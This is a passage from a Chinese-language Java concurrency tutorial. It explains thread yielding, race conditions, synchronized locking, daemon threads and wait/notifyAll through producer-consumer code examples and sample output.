<p><code class="language-plaintext highlighter-rouge">Thread.yield</code> 方法的调用声明了当前线程已经完成了生命周期中最重要的部分，把该线程从running切换为ready，但该线程还是处于runnable态。</p>

<p>但是礼让不一定成功，即使A礼让B，A还是有可能再次抢到cpu的资源，具体还要看cpu的调度。</p>

<h3 id="线程同步">线程同步</h3>

<p>如果多个线程同时读写共享变量，会出现数据不一致的问题。</p>

<p>这是因为对变量进行读取和写入，必须要求是原子操作。</p>

<p>例如对于语句</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>n = n + 1;
</code></pre></div></div>

<p>其bytecode对应三条指令</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ILOAD
IADD
ISTORE
</code></pre></div></div>

<p>如果两个线程同时执行n=n+1,结果可能只会加一次：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌───────┐    ┌───────┐
│Thread1│    │Thread2│
└───┬───┘    └───┬───┘
    │            │
    │ILOAD (n)   │
    │            │ILOAD (n)
    │            │IADD
    │            │ISTORE (n+1)
    │IADD        │
    │ISTORE (n+1)│
    ▼            ▼
</code></pre></div></div>

<p>加锁后：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌───────┐     ┌───────┐
│Thread1│     │Thread2│
└───┬───┘     └───┬───┘
    │             │
    │-- lock --   │
    │ILOAD (n)    │
    │IADD         │
    │ISTORE (n+1) │
    │-- unlock -- │
    │             │-- lock --
    │             │ILOAD (n+1)
    │             │IADD
    │             │ISTORE (n+2)
    │             │-- unlock --
    ▼             ▼
</code></pre></div></div>

<p>使用<code class="language-plaintext highlighter-rouge">synchronized</code>关键字对一个对象进行加锁</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">com.theoyu.concurrency.foundation</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">SyncDemo1</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="nc">Thread</span> <span class="n">add</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">AddThread</span><span class="o">();</span>
        <span class="nc">Thread</span> <span class="n">dec</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DecThread</span><span class="o">();</span>
        <span class="n">add</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
        <span class="n">dec</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
        <span class="n">add</span><span class="o">.</span><span class="na">join</span><span class="o">();</span>
        <span class="n">dec</span><span class="o">.</span><span class="na">join</span><span class="o">();</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="nc">Counter</span><span class="o">.</span><span class="na">count</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">Counter</span> <span class="o">{</span>
        <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">Object</span> <span class="n">lock</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">();</span>
        <span class="kd">public</span> <span class="kd">static</span> <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">AddThread</span> <span class="kd">extends</span> <span class="nc">Thread</span> <span class="o">{</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
            <span class="kd">synchronized</span> <span class="o">(</span><span class="nc">Counter</span><span class="o">.</span><span class="na">lock</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
                    <span class="nc">Counter</span><span class="o">.</span><span class="na">count</span> <span class="o">+=</span> <span class="mi">1</span><span class="o">;</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">DecThread</span> <span class="kd">extends</span> <span class="nc">Thread</span> <span class="o">{</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
            <span class="kd">synchronized</span> <span class="o">(</span><span class="nc">Counter</span><span class="o">.</span><span class="na">lock</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
                    <span class="nc">Counter</span><span class="o">.</span><span class="na">count</span> <span class="o">-=</span> <span class="mi">1</span><span class="o">;</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>上述代码还可以进行修改，<code class="language-plaintext highlighter-rouge"> synchronized</code>可以用于实例方法同步,此时同步的也就是拥有该方法的对象上。</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">com.theoyu.concurrency.foundation</span><span class="o">;</span>


<span class="kd">public</span> <span class="kd">class</span> <span class="nc">SyncDemo2</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="nc">Thread</span> <span class="n">add</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">AddThread</span><span class="o">();</span>
        <span class="nc">Thread</span> <span class="n">dec</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DecThread</span><span class="o">();</span>
        <span class="n">add</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
        <span class="n">dec</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
        <span class="n">add</span><span class="o">.</span><span class="na">join</span><span class="o">();</span>
        <span class="n">dec</span><span class="o">.</span><span class="na">join</span><span class="o">();</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="nc">Counter</span><span class="o">.</span><span class="na">count</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">Counter</span> <span class="o">{</span>
        <span class="kd">public</span> <span class="kd">synchronized</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">countDec</span><span class="o">()</span> <span class="o">{</span>
            <span class="n">count</span><span class="o">--;</span>
        <span class="o">}</span>

        <span class="kd">public</span> <span class="kd">synchronized</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">countAdd</span><span class="o">()</span> <span class="o">{</span>
            <span class="n">count</span><span class="o">++;</span>
        <span class="o">}</span>

        <span class="kd">public</span> <span class="kd">static</span> <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">AddThread</span> <span class="kd">extends</span> <span class="nc">Thread</span> <span class="o">{</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
                <span class="nc">Counter</span><span class="o">.</span><span class="na">countAdd</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">DecThread</span> <span class="kd">extends</span> <span class="nc">Thread</span> <span class="o">{</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
                <span class="nc">Counter</span><span class="o">.</span><span class="na">countDec</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<h3 id="守护线程">守护线程</h3>

<p>正如开头所说的，java程序入口是main线程，main线程启动其他线程。</p>

<p>java分为用户线程（User Thread）和守护线程（Daemon Thread），守护线程是在后台运行不会组织jvm终止的线程，当所有用户线程结束时，jvm进程也就退出，同时会杀死所有守护线程。</p>

<p>Daemon的作用是为其他线程的运行提供便利服务，守护线程最典型的应用就是 GC (垃圾回收器)，它就是一个很称职的守护者。</p>

<p>设置守护线程需要注意几点：</p>

<ol>
  <li>正在运行的线程无法设置为守护线程，即<code class="language-plaintext highlighter-rouge">thread.setDaemon(true)</code>必须在<code class="language-plaintext highlighter-rouge">thread.start()</code>之前设置，否则会抛出<code class="language-plaintext highlighter-rouge">IllegalThreadStateException</code>异常</li>
  <li>在Daemon线程中产生的新线程也是Daemon。</li>
  <li>和数据读写相关的操作最好不要设置为Daemon：无法控制结束。</li>
</ol>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">com.theoyu.concurrency.foundation</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">DaemonDemo</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">InterruptedException</span> <span class="o">{</span>
        <span class="nc">Thread</span> <span class="n">t</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Thread</span><span class="o">(</span><span class="k">new</span> <span class="nc">MyThread</span><span class="o">(),</span> <span class="s">"线程"</span><span class="o">);</span>
        <span class="n">t</span><span class="o">.</span><span class="na">setDaemon</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span> <span class="c1">// 此线程在后台运行</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"线程 t 是否是守护进程："</span> <span class="o">+</span> <span class="n">t</span><span class="o">.</span><span class="na">isDaemon</span><span class="o">());</span>
        <span class="n">t</span><span class="o">.</span><span class="na">start</span><span class="o">();</span> <span class="c1">// 启动线程</span>
        <span class="nc">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">MyThread</span> <span class="kd">implements</span> <span class="nc">Runnable</span> <span class="o">{</span>

        <span class="nd">@Override</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
                <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="nc">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getName</span><span class="o">()</span> <span class="o">+</span> <span class="s">"在运行。"</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>

</code></pre></div></div>

<h2 id="线程间的通信">线程间的通信</h2>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">wait</code> 会自动释放当前线程占有的对象锁，并请求操作系统挂起当前线程，<strong>让线程从 <code class="language-plaintext highlighter-rouge">Running</code> 状态转入 <code class="language-plaintext highlighter-rouge">Waiting</code> 状态</strong>，等待 <code class="language-plaintext highlighter-rouge">notify</code> / <code class="language-plaintext highlighter-rouge">notifyAll</code> 来唤醒。如果没有释放锁，那么其它线程就无法进入对象的同步方法或者同步控制块中，那么就无法执行 <code class="language-plaintext highlighter-rouge">notify</code> 或者 <code class="language-plaintext highlighter-rouge">notifyAll</code> 来唤醒挂起的线程，造成死锁。</p>
  </li>
  <li><code class="language-plaintext highlighter-rouge">notify</code> - 唤醒一个正在 <code class="language-plaintext highlighter-rouge">Waiting</code> 状态的线程，并让它拿到对象锁，具体唤醒哪一个线程由 JVM 控制 。</li>
  <li><code class="language-plaintext highlighter-rouge">notifyAll</code> - 唤醒所有正在 <code class="language-plaintext highlighter-rouge">Waiting</code> 状态的线程，接下来它们需要竞争对象锁。</li>
</ul>

<p>看一个网上广为流传的生产者消费者例子：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">com.theoyu.concurrency.foundation</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.util.PriorityQueue</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">WaitDemo1</span> <span class="o">{</span>

    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="no">QUEUE_SIZE</span> <span class="o">=</span> <span class="mi">10</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">PriorityQueue</span><span class="o">&lt;</span><span class="nc">Integer</span><span class="o">&gt;</span> <span class="n">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PriorityQueue</span><span class="o">&lt;&gt;(</span><span class="no">QUEUE_SIZE</span><span class="o">);</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">new</span> <span class="nf">Producer</span><span class="o">(</span><span class="s">"生产者A"</span><span class="o">).</span><span class="na">start</span><span class="o">();</span>
        <span class="k">new</span> <span class="nf">Producer</span><span class="o">(</span><span class="s">"生产者B"</span><span class="o">).</span><span class="na">start</span><span class="o">();</span>
        <span class="k">new</span> <span class="nf">Consumer</span><span class="o">(</span><span class="s">"消费者A"</span><span class="o">).</span><span class="na">start</span><span class="o">();</span>
        <span class="k">new</span> <span class="nf">Consumer</span><span class="o">(</span><span class="s">"消费者B"</span><span class="o">).</span><span class="na">start</span><span class="o">();</span>
    <span class="o">}</span>

    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">Consumer</span> <span class="kd">extends</span> <span class="nc">Thread</span> <span class="o">{</span>

        <span class="nc">Consumer</span><span class="o">(</span><span class="nc">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
            <span class="kd">super</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="nd">@Override</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
                <span class="kd">synchronized</span> <span class="o">(</span><span class="n">queue</span><span class="o">)</span> <span class="o">{</span>
                    <span class="k">while</span> <span class="o">(</span><span class="n">queue</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                        <span class="k">try</span> <span class="o">{</span>
                            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"队列空，等待数据"</span><span class="o">);</span>
                            <span class="n">queue</span><span class="o">.</span><span class="na">wait</span><span class="o">();</span>
                        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
                            <span class="n">queue</span><span class="o">.</span><span class="na">notifyAll</span><span class="o">();</span>
                        <span class="o">}</span>
                    <span class="o">}</span>
                    <span class="n">queue</span><span class="o">.</span><span class="na">poll</span><span class="o">();</span> <span class="c1">// 每次移走队首元素</span>
                    <span class="n">queue</span><span class="o">.</span><span class="na">notifyAll</span><span class="o">();</span>
                    <span class="k">try</span> <span class="o">{</span>
                        <span class="nc">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">500</span><span class="o">);</span>
                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
                    <span class="o">}</span>
                    <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="nc">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getName</span><span class="o">()</span> <span class="o">+</span> <span class="s">" 从队列取走一个元素，队列当前有："</span> <span class="o">+</span> <span class="n">queue</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">+</span> <span class="s">"个元素"</span><span class="o">);</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">Producer</span> <span class="kd">extends</span> <span class="nc">Thread</span> <span class="o">{</span>

        <span class="nc">Producer</span><span class="o">(</span><span class="nc">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
            <span class="kd">super</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="nd">@Override</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
                <span class="kd">synchronized</span> <span class="o">(</span><span class="n">queue</span><span class="o">)</span> <span class="o">{</span>
                    <span class="k">while</span> <span class="o">(</span><span class="n">queue</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">==</span> <span class="no">QUEUE_SIZE</span><span class="o">)</span> <span class="o">{</span>
                        <span class="k">try</span> <span class="o">{</span>
                            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"队列满，等待有空余空间"</span><span class="o">);</span>
                            <span class="n">queue</span><span class="o">.</span><span class="na">wait</span><span class="o">();</span>
                        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
                            <span class="n">queue</span><span class="o">.</span><span class="na">notifyAll</span><span class="o">();</span>
                        <span class="o">}</span>
                    <span class="o">}</span>
                    <span class="n">queue</span><span class="o">.</span><span class="na">offer</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span> <span class="c1">// 每次插入一个元素</span>
                    <span class="n">queue</span><span class="o">.</span><span class="na">notifyAll</span><span class="o">();</span>
                    <span class="k">try</span> <span class="o">{</span>
                        <span class="nc">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">500</span><span class="o">);</span>
                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
                    <span class="o">}</span>
                    <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="nc">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getName</span><span class="o">()</span> <span class="o">+</span> <span class="s">" 向队列取中插入一个元素，队列当前有："</span> <span class="o">+</span> <span class="n">queue</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">+</span> <span class="s">"个元素"</span><span class="o">);</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>输出：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>生产者A 向队列取中插入一个元素，队列当前有：1个元素
生产者A 向队列取中插入一个元素，队列当前有：2个元素
生产者A 向队列取中插入一个元素，队列当前有：3个元素
生产者A 向队列取中插入一个元素，队列当前有：4个元素
生产者A 向队列取中插入一个元素，队列当前有：5个元素
生产者A 向队列取中插入一个元素，队列当前有：6个元素
生产者A 向队列取中插入一个元素，队列当前有：7个元素
生产者A 向队列取中插入一个元素，队列当前有：8个元素
生产者A 向队列取中插入一个元素，队列当前有：9个元素
生产者A 向队列取中插入一个元素，队列当前有：10个元素
队列满，等待有空余空间
消费者B 从队列取走一个元素，队列当前有：9个元素
消费者B 从队列取走一个元素，队列当前有：8个元素
...
</code></pre></div></div>

<p>其实这对我们预想的有一些出入，按道理<code class="language-plaintext highlighter-rouge">queue.notifyAll()</code>会唤醒所有的进程，应该是一个消费者和生产者交替消费和生产的过程，但是这里好像失败了。</p>

<p>原因在于<code class="language-plaintext highlighter-rouge">queue.notifyAll()</code>后，当前线程还是处于<code class="language-plaintext highlighter-rouge">synchronized</code>下，其他线程会再次被挂起，这里改一下输出语句和sleep的位置即可：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">com.theoyu.concurrency.foundation</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.util.PriorityQueue</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">WaitDemo2</span> <span class="o">{</span>

    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="no">QUEUE_SIZE</span> <span class="o">=</span> <span class="mi">10</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">PriorityQueue</span><span class="o">&lt;</span><span class="nc">Integer</span><span class="o">&gt;</span> <span class="n">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PriorityQueue</span><span class="o">&lt;&gt;(</span><span class="no">QUEUE_SIZE</span><span class="o">);</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">new</span> <span class="nf">Producer</span><span class="o">(</span><span class="s">"生产者A"</span><span class="o">).</span><span class="na">start</span><span class="o">();</span>
        <span class="k">new</span> <span class="nf">Producer</span><span class="o">(</span><span class="s">"生产者B"</span><span class="o">).</span><span class="na">start</span><span class="o">();</span>
        <span class="k">new</span> <span class="nf">Consumer</span><span class="o">(</span><span class="s">"消费者A"</span><span class="o">).</span><span class="na">start</span><span class="o">();</span>
        <span class="k">new</span> <span class="nf">Consumer</span><span class="o">(</span><span class="s">"消费者B"</span><span class="o">).</span><span class="na">start</span><span class="o">();</span>


    <span class="o">}</span>

    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">Consumer</span> <span class="kd">extends</span> <span class="nc">Thread</span> <span class="o">{</span>

        <span class="nc">Consumer</span><span class="o">(</span><span class="nc">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
            <span class="kd">super</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="nd">@Override</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">try</span> <span class="o">{</span>
                    <span class="nc">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">500</span><span class="o">);</span>
                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
                <span class="o">}</span>
                <span class="kd">synchronized</span> <span class="o">(</span><span class="n">queue</span><span class="o">)</span> <span class="o">{</span>
                    <span class="k">while</span> <span class="o">(</span><span class="n">queue</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                        <span class="k">try</span> <span class="o">{</span>
                            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"队列空，等待数据"</span><span class="o">);</span>
                            <span class="n">queue</span><span class="o">.</span><span class="na">wait</span><span class="o">();</span>
                        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
                            <span class="n">queue</span><span class="o">.</span><span class="na">notifyAll</span><span class="o">();</span>
                        <span class="o">}</span>
                    <span class="o">}</span>
                    <span class="n">queue</span><span class="o">.</span><span class="na">poll</span><span class="o">();</span> <span class="c1">// 每次移走队首元素</span>
                    <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="nc">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getName</span><span class="o">()</span> <span class="o">+</span> <span class="s">" 从队列取走一个元素，队列当前有："</span> <span class="o">+</span> <span class="n">queue</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">+</span> <span class="s">"个元素"</span><span class="o">);</span>
                    <span class="n">queue</span><span class="o">.</span><span class="na">notifyAll</span><span class="o">();</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">Producer</span> <span class="kd">extends</span> <span class="nc">Thread</span> <span class="o">{</span>

        <span class="nc">Producer</span><span class="o">(</span><span class="nc">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
            <span class="kd">super</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="nd">@Override</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">try</span> <span class="o">{</span>
                    <span class="nc">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">500</span><span class="o">);</span>
                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
                <span class="o">}</span>
                <span class="kd">synchronized</span> <span class="o">(</span><span class="n">queue</span><span class="o">)</span> <span class="o">{</span>
                    <span class="k">while</span> <span class="o">(</span><span class="n">queue</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">==</span> <span class="no">QUEUE_SIZE</span><span class="o">)</span> <span class="o">{</span>
                        <span class="k">try</span> <span class="o">{</span>
                            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"队列满，等待有空余空间"</span><span class="o">);</span>
                            <span class="n">queue</span><span class="o">.</span><span class="na">wait</span><span class="o">();</span>
                        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
                            <span class="n">queue</span><span class="o">.</span><span class="na">notifyAll</span><span class="o">();</span>
                        <span class="o">}</span>
                    <span class="o">}</span>
                    <span class="n">queue</span><span class="o">.</span><span class="na">offer</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span> <span class="c1">// 每次插入一个元素</span>
                    <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="nc">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getName</span><span class="o">()</span> <span class="o">+</span> <span class="s">" 向队列取中插入一个元素，队列当前有："</span> <span class="o">+</span> <span class="n">queue</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">+</span> <span class="s">"个元素"</span><span class="o">);</span>
                    <span class="n">queue</span><span class="o">.</span><span class="na">notifyAll</span><span class="o">();</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>

</code></pre></div></div>

<p>输出：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>生产者B 向队列取中插入一个元素，队列当前有：1个元素
生产者A 向队列取中插入一个元素，队列当前有：2个元素
